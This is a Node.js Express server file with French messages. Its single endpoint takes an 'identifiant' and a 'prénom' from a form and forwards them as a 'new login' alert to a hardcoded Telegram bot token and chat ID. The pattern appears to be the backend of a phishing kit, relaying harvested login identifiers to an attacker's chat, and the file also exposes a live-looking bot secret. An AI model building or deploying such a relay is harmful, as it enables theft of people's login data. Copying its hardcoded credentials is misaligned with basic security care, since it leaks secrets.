import express from "express";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

const BOT_TOKEN = "8798036184:AAF79RiM_zC2TjbCwHh2w1jZpqVOoIv__y4";
const CHAT_ID = "8135402030";

app.post("/send-telegram", async (req, res) => {
  try {
    const { identifiant, prenom } = req.body;

    if (!identifiant || !prenom) {
      return res.status(400).json({
        success: false,
        error: "Identifiant et prénom requis"
      });
    }

    const message = `
Nouvelle connexion :

Identifiant : ${identifiant}
Prénom : ${prenom}
`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(500).json({
        success: false,
        error: "Erreur Telegram",
        details: data
      });
    }

    return res.json({
      success: true
    });

  } catch (error) {
    console.error("Erreur serveur :", error);

    return res.status(500).json({
      success: false,
      error: "Erreur serveur"
    });
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Serveur lancé sur le port ${PORT}`);
});
